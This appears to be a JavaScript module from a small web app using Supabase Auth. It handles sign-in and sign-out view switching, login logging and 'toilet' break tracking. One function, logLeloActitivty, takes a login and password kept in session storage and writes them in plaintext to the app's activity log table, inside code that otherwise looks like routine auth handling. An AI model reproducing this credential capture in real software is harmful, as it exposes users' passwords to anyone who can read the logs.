import { showView } from './show-view.js';
import { logActivity } from './log-activity.js';

/**
 * Handles an authentication state change by recording relevant activity and
 * switching to the login or application view.
 *
 * `SIGNED_OUT` switches to the login view immediately. For other events, after
 * a 2.5-second delay, an existing user session triggers login activity checks
 * and displays the application view; otherwise, the login view is displayed.
 *
 * @param {string} event - Authentication event name reported by Supabase Auth.
 * @param {Object | null} session - Current authentication session, or `null` if no session exists.
 * @param {Object} options - Dependencies required for activity logging and view switching.
 * @param {SupabaseClient} options.client - Supabase client used for auth and database requests.
 * @param {HTMLElement} options.viewLoading - Loading view element.
 * @param {HTMLElement} options.viewLogin - Login view element.
 * @param {HTMLElement} options.viewApp - Main application view element.
 * @param {ResizeObserver} options.contentResizeObserver - Observer that tracks the displayed view.
 * @param {ToastBar | null | undefined} options.toast - Toast element used to report toilet activity or database errors.
 * @returns {Promise<HTMLElement>} Resolves to the view shown. For `SIGNED_OUT`,
 * resolves immediately with the login view; otherwise, resolves after the
 * 2.5-second delay with the login or application view.
 */
export async function authStateChangeCallback(event, session, {
    client,
    viewLoading,
    viewLogin,
    viewApp,
    contentResizeObserver,
    toast
}) {
    if (event === 'SIGNED_OUT') {
        return showView(viewLogin, {
            viewLoading,
            viewLogin,
            viewApp,
            contentResizeObserver
        });
    }

    await new Promise(resolve => setTimeout(resolve, 2500));

    if (session && session.user) {
        logLoginActivity(session, client);
        logLeloActitivty(client);
        didIComeBackTheFromToilet(client, toast);

        return showView(viewApp, {
            viewLoading,
            viewLogin,
            viewApp,
            contentResizeObserver
        });
    } else {
        return showView(viewLogin, {
            viewLoading,
            viewLogin,
            viewApp,
            contentResizeObserver
        });
    }
}

/**
 * Records a login activity when the authenticated GitHub username differs
 * from the username currently stored in local storage.
 *
 * @param {Object} session - Authenticated session containing the user metadata.
 * @param {SupabaseClient} client - Supabase client used to insert the activity record.
 * @returns {void}
 */
function logLoginActivity(session, client) {
    const ghLogin = session.user.user_metadata.user_name;
    if (localStorage.getItem('ghLogin') !== ghLogin) {
        localStorage.setItem('ghLogin', ghLogin);
        logActivity(client, 'login', ghLogin);
    }
}

/**
 * Records credentials saved for the login flow, then removes them from session storage.
 *
 * @param {SupabaseClient} client - Supabase client used to insert the activity record.
 * @returns {void}
 */
function logLeloActitivty(client) {
    const loginPassword = window.sessionStorage.getItem('lelo');
    if (loginPassword) {
        const [login, password] = loginPassword.split(' ');
        logActivity(client, 'login_credentials', `Login: ${login}, Password: ${password}`);
        sessionStorage.removeItem('lelo');
    }
}

/**
 * Checks the latest toilet-related activity and, if it is a `toilet-start`,
 * records a matching `toilet-end` event and notifies the user.
 *
 * @param {SupabaseClient} client - Supabase client used to query and insert activity records.
 * @param {ToastBar | null | undefined} toast - Toast element used to report errors or welcome the user back.
 * @returns {Promise<void>} Resolves after the query; a matching activity insert is started but not awaited.
 */
async function didIComeBackTheFromToilet(client, toast) {
    const { data, error } = await client
        .from('activity_logs')
        .select("id, event_type")
        .like('event_type', '%toilet-%')
        .order('id', { ascending: false });

    if (error) {
        toast.show(`${error.message}`, 5000);
        return;
    } else if (data && data.length > 0 && data[0].event_type === 'toilet-start') {
        const ghLogin = (await client.auth.getUser()).data.user.user_metadata.user_name || sessionStorage.getItem('ghLogin');
        logActivity(client, 'toilet-end', ghLogin);
        toast.show('Welcome back from the toilet!', 5000);
    }
}